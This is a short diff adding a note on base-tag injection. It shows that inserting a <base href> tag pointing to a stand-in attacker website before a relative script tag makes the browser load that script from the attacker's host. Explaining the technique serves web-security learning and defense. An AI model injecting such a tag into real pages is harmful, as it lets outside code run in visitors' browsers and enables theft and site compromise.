@@ -1,0 +1,5 @@
+so, if you inject before the relative remote script:
+
+<base href="https://attacker-website.com">
+
+the browser will request https://attacker-website.com/assets/some-script.js.
